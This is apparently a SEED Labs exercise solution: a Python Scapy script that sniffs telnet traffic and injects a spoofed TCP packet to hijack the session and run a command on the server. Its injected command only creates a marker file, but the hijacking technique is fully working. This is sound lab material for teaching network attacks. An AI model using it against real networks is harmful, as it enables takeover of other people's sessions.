#!/usr/bin/env python3
"""
Task 3: TCP Session Hijacking (Automatic)
SEED Labs - TCP/IP Attack Lab

This script automatically sniffs telnet traffic to extract TCP session
parameters and then injects a malicious command into the session.

Usage:
    python3 session_hijack_auto.py
"""

from scapy.all import *

IFACE   = "br-<network_id>"   # replace with actual bridge interface name
FILTER  = "tcp and dst port 23"  # capture packets going TO the telnet server

# Malicious shell command to execute on the server
MALICIOUS_CMD = "\r touch /tmp/hijacked \r"

injected = False  # send the payload only once


def hijack(pkt):
    """Sniff a telnet packet and inject a malicious command."""
    global injected
    if injected:
        return
    if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return

    ip_layer  = pkt[IP]
    tcp_layer = pkt[TCP]

    # Build a spoofed ACK packet with the injected payload
    ip  = IP(src=ip_layer.src, dst=ip_layer.dst)
    tcp = TCP(
        sport=tcp_layer.sport,
        dport=tcp_layer.dport,
        flags="A",
        seq=tcp_layer.seq,
        ack=tcp_layer.ack,
    )
    spoof_pkt = ip / tcp / MALICIOUS_CMD
    send(spoof_pkt, verbose=0)
    injected = True
    print(f"[*] Injected command into session "
          f"{ip_layer.src}:{tcp_layer.sport} -> "
          f"{ip_layer.dst}:{tcp_layer.dport}")


print(f"[*] Sniffing telnet traffic on {IFACE} ...")
sniff(iface=IFACE, filter=FILTER, prn=hijack)
